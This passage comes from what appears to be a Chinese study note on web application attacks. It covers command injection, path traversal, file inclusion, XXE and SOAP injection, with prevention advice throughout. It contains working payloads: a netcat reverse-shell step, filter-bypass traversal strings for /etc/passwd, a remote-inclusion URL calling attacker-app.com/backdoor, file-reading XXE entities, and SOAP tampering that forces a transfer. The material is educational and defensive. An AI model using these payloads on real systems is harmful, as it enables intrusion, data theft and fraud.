<li>通过 ping 及其时间参数，让操作系统在接下来的一段时间访问本地的回环接口（即 127.0.0.1）来制作延迟；</li>
<li>如果发生时间延迟，则说明漏洞有可能存在；接下来可以通过命令选项 -i 或 -n 逐渐递增间隔或次数，观察延迟的时间是否跟着增加；如果是的话，说明漏洞很大可能存在，同时也可以排除延迟是因为网络造成的；</li>
<li>使用可成功实施攻击的注入字符串，尝试注入更有用的命令（例如 ls 或 dir），看是否能够将命令结果返回到浏览器上；</li>
<li>如果无法将结果返回给浏览器，则可以尝试建立带外通道<ul>
<li>例如使用 TFTP 将工具上传到服务器，使用 telnet 或 netcat 建立一个和自己的计算相连接的反向 shell，然后使用 mail 命令通过 SMTP 发送命令执行结果；</li>
<li>可以将命令的结果重定向的某个可以公开访问的静态资源文件夹，然后通过浏览器访问它；</li>
</ul>
</li>
<li>一量找到注入命令的方法并能够获得命令执行结果，接下来应当确定自己的权限（例如使用 whoami 命令，或者尝试给某个写保护的文件夹写入一个无害的文件）；确定权限后，就设法提升自己的权限，或者借由该服务器攻击其他主机；</li>
</ul>
<p>有时候应用程序会过滤掉某些符号和字符，导致无法注入独立的系统命令；尽管如此，攻击者仍然有机会破坏开发者设定的命令行为；例如通过故意提供错误的输入，让命令报错，并将错误重定向到某个可执行文件中；而攻击者提供的错误输入，可能故意夹杂着可执行代码；随后通过浏览器访问可执行文件，执行混入的代码；</p>
<ul>
<li>&lt; 和 &gt; 两个符号可以用来重定向，当不能执行独立的命令时，如果这两个符号可用，则可以利用它们来读取或写入任意的文件内容；</li>
<li>操作系统的命令通常支持大量的参数，参数之间同样使用空格间隔；如果应用程序基于用户的输入来生成这些参数，则可以通过在参数中混入空格，然后提供额外的参数，实现攻击效果，例如利用 -O 参数将内容写入任意的文件；</li>
</ul>
<blockquote>
<p>有时应用程序会过滤空格，此时可以通过调用包含空格符字段的环境变量 $IFS 来实现空格的效果；</p>
</blockquote>
<h3 id="查找动态执行漏洞"><a href="#查找动态执行漏洞" class="headerlink" title="查找动态执行漏洞"></a>查找动态执行漏洞</h3><p>动态执行漏洞常见于 PHP 和 Perl 等语言；但绝大多数应用程序平台都可能向基于脚本的解释器传送用户提供的输入；</p>
<p>渗透测试步骤</p>
<ul>
<li>理论上用户提供的任何数据都可以提交给动态执行函数；其中最常见的数据项是是cookie 名称和参数值；</li>
<li>尝试轮流向目标参数提交下列值，观察它们的返回结果<ul>
<li>;echo%20111111</li>
<li>echo%20111111</li>
<li>response.write%20111111</li>
<li>:response.write%20111111</li>
</ul>
</li>
<li>如果字符串 111111 被单独返回，说明该字符串前面没有其他字符串，因此该处可能存在注入漏洞；</li>
<li>如果字符串 111111 未被返回，说明存在其他字符串，此时应寻找输入被动态执行的错误消息；根据需要对语法进行调整，以实现注入任意的命令；</li>
<li>如果攻击的应用程序是 PHP，可以使用测试字符串 phpinfo()；如果它被成功执行，会返回 PHP 的配置信息；</li>
<li>如果应用程序可能存在注入漏洞，则同样可以通过制造延迟的方法来确认漏洞的存在，例如：system(‘ping%20127.0.0.1’)</li>
</ul>
<h3 id="防止-OS-命令注入"><a href="#防止-OS-命令注入" class="headerlink" title="防止  OS 命令注入"></a>防止  OS 命令注入</h3><p>防止 OS 命令注入的最好办法是一劳永逸的避免在程序中直接调用操作系统的命令，而是改由调用内置的 API 来实现；如果实在无法做到，则应该对用户的输入进行严格的控制，例如增加一份白名单，限制长度，并只需要字母和数字，不得包含任何的符号；</p>
<p>应用程序应尽量使用内置的 API 的名称和参数来启动目标进程，而不是直接向 shell 解释器传递命令字符串，这样可以利用内置 API 的检查机制来增加额外的保护；</p>
<h3 id="防止脚本注入漏洞"><a href="#防止脚本注入漏洞" class="headerlink" title="防止脚本注入漏洞"></a>防止脚本注入漏洞</h3><p>最佳方法是避免将任何用户提供的输入，直接传给任何动态执行函数；如果无法做到，则应该建立严格的白名单；</p>
<h2 id="操作文件路径"><a href="#操作文件路径" class="headerlink" title="操作文件路径"></a>操作文件路径</h2><p>有些 Web 应用程序提供某个功能，该功能支持接受用户输入的一个文件名或者路径名，然后应用程序调用系统的 API 查找或读取该文件或目录；如果没有对用户提交的输入进行严格的检查，就有可能存在注入的漏洞；</p>
<h3 id="路径遍历漏洞"><a href="#路径遍历漏洞" class="headerlink" title="路径遍历漏洞"></a>路径遍历漏洞</h3><p>有些 Web 应用程序根据客户端提交的文件名，通过拼接路径的方式，读取并返回服务器上存储的静态文件（或者是将数据写入到服务器上面）；攻击者可以在文件名参数中加入 .. （点点）符号，来遍历整个文件树，读取甚至修改一些敏感信息，从而获得整个服务器的控制权；</p>
<p>虽然这种漏洞形式被广泛应用，常见的 Web 应用框架会采取一些防御措施，例如对客户端的输入进行过滤；但是这仍然无法阻止技术熟练的攻击者。</p>
<h4 id="查找和利用路径遍历漏洞"><a href="#查找和利用路径遍历漏洞" class="headerlink" title="查找和利用路径遍历漏洞"></a>查找和利用路径遍历漏洞</h4><h5 id="确定攻击目标"><a href="#确定攻击目标" class="headerlink" title="确定攻击目标"></a>确定攻击目标</h5><p>在对应用程序分析的步骤中，一般就需要确定潜在的攻击面，主要用于文件的上传和下载的功能（例如可共享文档的应用程序、允许用户上传图像的博客、商品信息上传的拍卖平台、为用户提供电子书、技术手册、公司报表等信息型应用程序）；这些功能都有一个特征，即需要跟文件系统进行交互；</p>
<p>渗透测试步骤</p>
<ul>
<li>在解析应用程序功能的过程中，留意在请求参数中带有文件名或目录名的情形，例如 include&#x3D;main.inc 或者 template&#x3D;&#x2F;en&#x2F;sidebar；或者需要从服务端的文件系统中读取数据的功能，例如显示和下载图像；</li>
<li>在测试其他漏洞的过程中，留意一些反常事件或者有益的错误消息，看看是否有可能是因为用户提交的数据被传递给文件系统的 API 或者作为操作系统命令的参数；</li>
</ul>
<h5 id="探查路径遍历漏洞"><a href="#探查路径遍历漏洞" class="headerlink" title="探查路径遍历漏洞"></a>探查路径遍历漏洞</h5><p>当找到潜在的攻击目标后，设法确定漏洞是否存在，例如可以提交一个不会回溯到起始目录的遍历序列，例如将 file&#x3D;foo&#x2F;file.txt 参数修改为 file&#x3D;foo&#x2F;bar&#x2F;..&#x2F;file1.txt；</p>
<ul>
<li>如果服务端返回相同的结果，则说明漏洞很可能存在；</li>
<li>如果返回结果不同，则说明应用程序有对输入进行一定的过滤处理；此时需要找到过滤的规则，看是否有可能绕过它；</li>
</ul>
<p>如果发现漏洞可能存在，则尝试遍历出起始目录，例如可提交参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../n.ini</span><br><span class="line"># 注：此处 ../ 的数量需要反复试验</span><br></pre></td></tr></table></figure>

<p>如果幸运的话，有可能得到如下结果：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201221193400.png"></p>
<p>如果所攻击的功能拥有文件的写入权限，则可能不好确定该功能是否存在漏洞；因此需要确定一下写入的权限具体有多大；确定的办法是写两个文件：一个是任意用户均可实现写入的文件，另一个是即使根用户或者管理员也无法写入的文件；如果两次请求之间，应用程序表现出差异，则说明漏洞存在；</p>
<blockquote>
<p>关于文件路径的分隔符，Win 平台同时支持斜杠和反斜杠，但是 Unix 平台则只运行斜杠，因此最好二者都进行测试，以便能够覆盖并确认服务端使用的是哪种平台，或者哪种平台组件来</p>
</blockquote>
<h5 id="避开遍历攻击障碍"><a href="#避开遍历攻击障碍" class="headerlink" title="避开遍历攻击障碍"></a>避开遍历攻击障碍</h5><ul>
<li>应用程序可能只过滤一种序列，因此应同时尝试斜杠和反斜杠，因为文件系统两种格式都支持；</li>
<li>对遍历序列进行 URL 编码，例如点使用 %2e，斜杠使用 %2f，反斜杠使用 %5c</li>
<li>尝试使用 16 位的 Unicode 编码，例如点使用 %u002e，斜杠使用 %u2215，反斜杠使用 %u2216</li>
<li>尝试使用双倍 URL 编码，例如点使用 &amp;252e，斜杠使用 &amp;252f，反斜杠使用 %255c</li>
<li>尝试使用超长 UTF-8 编码，例如点使用 %c0%2e, %e0%40%ae, %c0ae；斜杠使用 %c0%af, %e0%80%cf, %c0%2f；反斜杠使用 %c0%5c, %c0%80%5c 等；</li>
<li>有很多字符可以使用非法的 Unicode 表示法来表示，它们被许多 Unicode 解码器识别并接受，尤其是 Windows 平台上面的解码器；</li>
<li>服务端正常应使用递归来净化客户端提交的输入，但有可能应用程序没有这么做，此时可以输入双序列，这样被过滤掉一个，仍然可以剩下一个发挥作用，例如： …. &#x2F;&#x2F;</li>
</ul>
<h5 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h5><p>服务端有时使用指定后缀的方式来检查客户端提交的请求，渗透测试步骤：</p>
<ul>
<li>在文件名和合法后缀之间放入一个使用 URL 编码的空字符，例如 “..&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini%00.jpg”；该方法能够生效的原因在于进行文件名检查的执行环境，和最终查找获取文件的环境不同，前者认为合法的字符串，到了获取环境变成了另外一种意思；</li>
<li>有些应用程序会只使用请求中的文件名，不包括后缀，然后自行在代码逻辑中添加后缀，这种情况下，前述的方式仍然可以起作用；</li>
<li>有些应用程序会检查文件名的开头是否是一个合法的目录，这种情况只需要配套使用双点即可避免检查，例如：filestore&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwc；</li>
<li>如果以上针对输入过滤的渗透都无法成功，则应用程序可能实施了多加复合的过滤方式，此时可以先从一个可以成功的请求做为起点，例如 foo.jpg，然后请求 bar&#x2F;..&#x2F;foo.jpg 如果失败的话，则尝试所有可能的遍历序列方式，直到该请求获得成功为止；如果仍然还是不行，则尝试请求 foo.jpg%00.jpg，看是否能够避开过滤；彻底检查应用程序的默认目录，了解它使用的所有过滤方式，然后针对这些过滤方式设计避开的技巧；</li>
</ul>
<h5 id="处理定制编码"><a href="#处理定制编码" class="headerlink" title="处理定制编码"></a>处理定制编码</h5><p>有些应用程序会对用户上传文件的文件名使用某种编码方案后，再返回编码后的名称做为访问该文件的 URL 地址；因此，可以利用该编码方案是否对路径进行规范化的漏洞来尝试获取想要的文件；</p>
<ul>
<li>先通过简单的文件名，测试编码方案，例如上传文件 test.txt，看它编码后的结果，例如为 zM1YTU4NTY2Y；</li>
<li>再尝试上传文件 foo&#x2F;..&#x2F;test.txt，看它编码后的结果是否仍为上一步的结果，还是长度有变化，如果有变化，则意味着应用程序没有对路径进行规范化，因此有漏洞；</li>
<li>尝试提交 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;.&#x2F;etc&#x2F;passwd&#x2F;..&#x2F;..&#x2F;tmp&#x2F;foo，它规范化的形式为 &#x2F;tmp&#x2F;foo，得到它的编码结果，然后截短它，以便得到路径的前半部分，这样就可以用来获取 &#x2F;etc&#x2F;passwd 文件；（此处需要留意编码对齐问题，因为类似 Base64 的编码方案是以三个字符为单位的，因此需要在路径中添加合适数量的点号来凑齐字符单位要求，同时不影响结果）；</li>
</ul>
<h5 id="利用遍历漏洞"><a href="#利用遍历漏洞" class="headerlink" title="利用遍历漏洞"></a>利用遍历漏洞</h5><p>当发现一个路径遍历漏洞后，通常攻击在服务器上将拥有和应用程序相同的读写权限；该漏洞可以用来做如下事情：</p>
<ul>
<li>获取操作系统与应用程序的密码文件；</li>
<li>获取服务器和应用程序的配置文件（可用来发现其他漏洞或优化其他攻击）；</li>
<li>可能获取数据库证书文件；</li>
<li>应用程序的数据源，例如 MySQL 数据库文件或 XML 文件；</li>
<li>服务器可执行页面的源代码（可用来做代码审查，搜索代码中的其他漏洞）；</li>
<li>可能包含用户名和会话令牌的应用程序日志文件；</li>
</ul>
<p>如果发现一个可写入任意的漏洞，则可以利用它在服务器上执行任意命令；</p>
<ul>
<li>在用户的启动文件夹中创建脚本；</li>
<li>当用户下一次连接时，修改 in.ftpd 等文件执行任意命令；</li>
<li>向一个拥有执行权限的 Web 目录写入脚本，然后通过浏览器访问它们，触发脚本的执行；</li>
</ul>
<h4 id="防止路径遍历漏洞"><a href="#防止路径遍历漏洞" class="headerlink" title="防止路径遍历漏洞"></a>防止路径遍历漏洞</h4><p>避免向文件系统传递任何用户提交的数据，是防御路径遍历漏洞的最好办法；如果必须允许用户指定上传文件的名称，则需要设置多重的防御组合：</p>
<ul>
<li>在对用户提交的文件名进行解码和规范化后，应检查文件名中是否包含路径遍历序列（例如斜杠和反斜杠）和空字节；如果有的话，则判定为恶意请求并停止处理，不得尝试对其进行净化；</li>
<li>应用使用应使用一个硬编码的可访问文件类型的列表，并拒绝访问其他类型文件的请求；</li>
<li>在进行过滤后，应用程序应检查文件是否位于指定的目录中（例如使用 get_full_path 之类的方法，获取文件的绝对路径，然后进行检查）；如果发现不在指定目录，则停止处理请求；</li>
<li>应用程序可使用 chrooted 文件系统来包含被访问文件的目录，该目录会自动忽略尝试向上遍历的请求（大多数 Linux 版本都支持 chrooted 文件系统）；</li>
<li>应用程序应将路径遍历攻击和日志及警报机制融合在一起，任何时候，只要收到一个非法请求，就发出警报，终止该用户的会话，冻结该账户，并通知管理员；</li>
</ul>
<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>有些脚本语言允许使用类似 include 的命令，来将某段代码插入到某个指定的位置，然后执行它们；</p>
<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>PHP 语言特别容易出现文件包含漏洞，因为它的包含函数接受远程文件路径，这种缺陷j是 PHP 出现了大量漏洞的根源；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 应用程序接一个位置参数，然后根据该参数调用相应的 php 文件，执行其中的代码</span></span><br><span class="line"><span class="comment"># 请求地址：https://whatever-app.com/main.php?country=US</span></span><br><span class="line"><span class="variable">$country</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;country&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>( <span class="variable">$country</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>由于 PHP 支持外部路径，因此攻击者可以通过传入一个远程 php 文件路径，让应用程序执行攻击想要执行的任意代码；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://whatever-app.com/main.php?country=http://attacker-app.com/backdoor</span></span><br></pre></td></tr></table></figure>

<h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>有些应用程序根据用户的输入，加载并执行某个本地文件，则用户可以利用这个漏洞</p>
<ul>
<li>让应用程序执行某个本应授权访问才能实现的功能；</li>
<li>访问服务上某些受保护的静态资源：通过将这些文件动态包含到应用程序的页面中，让执行环境将静态内容复制到响应中；</li>
</ul>
<h4 id="查找文件包含漏洞"><a href="#查找文件包含漏洞" class="headerlink" title="查找文件包含漏洞"></a>查找文件包含漏洞</h4><p>任何用户提交的数据项都可能产生文件包含漏洞，常常出现于由用户提交参数指定国家语言或者地理位置、由用户提交参数指定服务器的文件名；</p>
<p>远程文件包含的渗透测试步骤：</p>
<ul>
<li>向每一个目标参数提交一个连接受控制的 Web 服务器资源的 URL，然后监控受控制的服务器是否受到应用程序的请求；</li>
<li>尝试提交一个包含不存在的 IP 地址的 URL，看应用程序是否出现请求超时，如果是，说明应用程序尝试和该 IP 地址建立连接；</li>
<li>如果发现应用程序可受到远程文件包含攻击，则使用相关语言可用的 API，构建一段恶意脚本实施攻击；</li>
</ul>
<p>本地文件包含的渗透测试步骤：</p>
<ul>
<li>提交一个请求，指向服务器上一个已知可执行资源的名称，看应用程序的行为是否出现变化；</li>
<li>提交一个请求，指向服务器上一个已知静态资源的名称，看文件内容是否包含在响应中；</li>
<li>如果应用程序可受到本地包含文件攻击，则尝试通过 Web 服务器访问任何原本无法直接访问的敏感功能或资源；</li>
<li>尝试能够利用遍历技巧访问其他目录中的文件；</li>
</ul>
<h2 id="注入-XML-解释器"><a href="#注入-XML-解释器" class="headerlink" title="注入 XML 解释器"></a>注入 XML 解释器</h2><h3 id="注入-XML-外部实体"><a href="#注入-XML-外部实体" class="headerlink" title="注入 XML 外部实体"></a>注入 XML 外部实体</h3><p>标准的 XML 解析库支持使用实体引用，目的是用来在 XML 内部或外部引用数据；</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!---内部实体在头部定义，以下定义在解析时，会将 testref 替代为指定的 testrefvalue ---&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">testref</span> <span class="string">&quot;testrefvalue&quot;</span> &gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure>

<p>XML 还支持引用外部实体，该外部实体可用 URL 来指定，届时解析时会访问该 URL，提取其中的值，替换 XML 内部的符号；</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!---外部实体使用 SYSTEM 关键字来指定，引用时可使用 file 协议（本地文件）或者 http 协议（远程文件）；解析时，将会使用 win.ini 的内容来替代 xxe 字符串，攻击者间接获得 win.ini 的文件内容 ---&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///windows/win.ini&quot;</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Search</span>&gt;</span><span class="tag">&lt;<span class="name">SearchTerm</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">SearchTerm</span>&gt;</span><span class="tag">&lt;/<span class="name">Search</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>http 协议不仅可以用来获取传统意义上的远程服务，其实也可以访问其内网或者本地的其他进程服务；</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!---获取本地局域网 192.168.1.1 的 25 端口上的邮件服务器---&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.1.1:25&quot;</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Search</span>&gt;</span><span class="tag">&lt;<span class="name">SearchTerm</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">SearchTerm</span>&gt;</span><span class="tag">&lt;/<span class="name">Search</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过 http 请求，可发起以下攻击：</p>
<ul>
<li>可将应用程序变成一个代理服务器，获得该应用程序能够访问的各种敏感内容，包括其内部局域网地址中的内容；</li>
<li>攻击某些应用程序中可通过 URL 进行访问的漏洞；</li>
<li>通过遍历 IP 地址和端口号，测试后端系统哪些端口是开放的；如果该端口有开放，一般在响应时间上有差异；有时候还会在响应中包含端口服务的标题；</li>
</ul>
<h3 id="注入-SOAP"><a href="#注入-SOAP" class="headerlink" title="注入 SOAP"></a>注入 SOAP</h3><p>SOAP 的全称是 simple object access protocol，指简单对象访问协议；它使用 XML 标准来封装消息，并在 Web 应用程序的不同模块之间传递这些消息；另外有些大型企业应用也使用 SOAP 在不同计算机之间传递消息，以协同完成某个任务；</p>
<blockquote>
<p>XML 令人蛋疼的地方在于它是一种解释型语言，有自己的语法格式，因此，可以通过它的语法，改变数据本身的意义</p>
</blockquote>
<p>假设某个转账的原始请求为</p>
<p>FromAccount&#x3D;18281008&amp;Amount&#x3D;1000&amp;ToAccount&#x3D;08447656&amp;Submit&#x3D;Submit</p>
<p>在处理这个请求时，在 Web 应用程序的后端之间，使用 SOAP 封装的消息，此时请求被转换成如下格式</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">pre:Add</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">Account</span>&gt;</span></span><br><span class="line">            	<span class="tag">&lt;<span class="name">AccountFrom</span>&gt;</span>18281008<span class="tag">&lt;/<span class="name">AccountFrom</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Amount</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">Amount</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ClearFunds</span>&gt;</span>False<span class="tag">&lt;/<span class="name">ClearFunds</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ToAccount</span>&gt;</span>08447656<span class="tag">&lt;/<span class="name">ToAccount</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Account</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pre:Add</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于转出账户的余额不足，因此字段 ClearFunds 的值为 False，组件之间传递这条消息的目的是记录这笔交易请求，但同时并不真正转出金额，而是标记为转账失败；攻击者可以通过在原始请求中混入符合 XML 语法的字符，来改变消息的意义；</p>
<p>原始请求更改为：</p>
<p>FromAccount&#x3D;18281008&amp;Amount&#x3D;1000</Amount><ClearedFunds>True</ClearedFunds><Amount>1000&amp;ToAccount&#x3D;08447656&amp;Submit&#x3D;Submit</p>
<p>服务器在收到该请求后，如果没有对它进行净化和过滤，最终将解析成如下结果：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">pre:Add</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">Account</span>&gt;</span></span><br><span class="line">            	<span class="tag">&lt;<span class="name">AccountFrom</span>&gt;</span>18281008<span class="tag">&lt;/<span class="name">AccountFrom</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Amount</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">Amount</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ClearFunds</span>&gt;</span>True<span class="tag">&lt;/<span class="name">ClearFunds</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Amount</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">Amount</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ClearFunds</span>&gt;</span>False<span class="tag">&lt;/<span class="name">ClearFunds</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ToAccount</span>&gt;</span>08447656<span class="tag">&lt;/<span class="name">ToAccount</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Account</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pre:Add</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时应用程序的某个组件在处理该消息时，由于遇到的第一个 ClearFunds 字段的值是 True，因此有可能在账户余额不足的情况下，触发转账行为；</p>
<p>另外还可以通过注入注释，让某些 XML 字段失效，并用攻击者自己的元素替换被注释掉的元素；</p>
<p>原始请求设计为：</p>
<p>FromAccount&#x3D;18281008&amp;Amount&#x3D;1000</Amount><ClearedFunds>True</ClearedFunds><ToAccount><!--&ToAccount=-->08447656&amp;Submit&#x3D;Submit</p>
<p>服务端解析结果如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">pre:Add</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">Account</span>&gt;</span></span><br><span class="line">            	<span class="tag">&lt;<span class="name">AccountFrom</span>&gt;</span>18281008<span class="tag">&lt;/<span class="name">AccountFrom</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Amount</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">Amount</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ClearFunds</span>&gt;</span>True<span class="tag">&lt;/<span class="name">ClearFunds</span>&gt;</span><span class="tag">&lt;<span class="name">ToAccount</span>&gt;</span><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    			&lt;ClearFundres&gt;False&lt;/ClearedFunds&gt;</span></span><br><span class="line"><span class="comment">    			&lt;ToAccount&gt;--&gt;</span>08447656<span class="tag">&lt;/<span class="name">ToAccount</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Account</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pre:Add</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>请求的设计，让某部分 XML 字段被注释掉之后，仍然能够保持整体格式的合法性；</p>
</blockquote>
<h3 id="查找并利用-SOAP-注入"><a href="#查找并利用-SOAP-注入" class="headerlink" title="查找并利用 SOAP 注入"></a>查找并利用 SOAP 注入</h3><p>SOAP 注入漏洞可能不容易发现，主要是任意提交注入标签，会破坏 SOAP 的消息格式，而且只是因为格式错误而返回的错误提示也非常简单，并没有什么利用价值；</p>
<p>渗透测试步骤</p>
<ul>
<li>轮流在每个参数中提交一个恶意 XML 结束标签，例如 &lt;&#x2F;foo&gt;， 如果没有发生错误，说明输入要么没有插入到 SOAP 消息中，或者输入可能被净化了；</li>
<li>如果出现错误，再提交一对有效的起始与结束标签，例如 &lt;foo&gt;&lt;&#x2F;foo&gt;，如果错误消失了，则说明 SOAP 漏洞很可能存在；</li>
<li>查看提交的数据是否会在响应中返回，如果会的话，查看数据是原封不动的返回，还是以某种方式规范化了；轮流提交以下两个值，”test&lt;foo&#x2F;&gt;“ 和 “test&lt;foo&gt;&lt;&#x2F;foo&gt;“，如果返回的结果是 test，或者是另外一个值，则说明插入成功；</li>
<li>如果 HTTP 请求中包括多个参数，由于不知道这些参数在后端的生成顺序，因此，可以轮流在一个参数中插入注释字符串 “&lt;!–”，然后在另外一个参数中注入 “–&gt;“，看是否能够将 SOAP 消息的某个部分注释掉，从而破坏应用程序的逻辑，此时有可能造成非预期内的处理结果；</li>
</ul>
<p>SOAP 注入漏洞要能够利用成功，前提条件是知道整个 XML 的结构，这样才有办法设计专门的注入值，以便能够改变解析的结果；如果返回的错误消息不能提供这方面的信息的话，则漏洞就会很难发现；幸运的话，有可能返回的错误消息中会包含整个解析的结果，从而泄露了结构；运气不好的话，则攻击率会变得很低；</p>
<h3 id="防止-SOAP-注入"><a href="#防止-SOAP-注入" class="headerlink" title="防止 SOAP 注入"></a>防止 SOAP 注入</h3><p>防止 SOAP 注入的办法是对用户的输入进行边界确认，不仅包含确认用户的当前输入，还包括用户前面步骤的输入，或者应用程序基于用户输入在过程中产生的数据；</p>
<p>为了防止攻击，应用程序应对用户输入中出现的任何 XML 元字符进行 HTML 编码，用 HTML 编码替代用户输入中的字面值；这样做的目的是让 XML 解析器不会将用户输入中的 XML 元字符当作有意义的语义的组成部分；几个会造成注入漏洞的 XML 元字符为：</p>
<ul>
<li>左尖括号 &lt;，应编码为 &amp;1t</li>
<li>右尖括号 &gt;，应编码为 &amp;gt</li>
<li>斜杠 &#x2F;，应编码为 &amp;#47</li>
</ul>
<h2 id="注入后端-HTTP-请求"><a href="#注入后端-HTTP-请求" class="headerlink" title="注入后端 HTTP 请求"></a>注入后端 HTTP 请求</h2><p>应用程序经常会将用户输入弄成键值对的形式，嵌入到后端发起的 HTTP 请求中，因此攻击者可以利用这方面的漏洞将应用程序做为代理器，来访问一些本来没有权限访问的资源，例如：</p>
<ul>
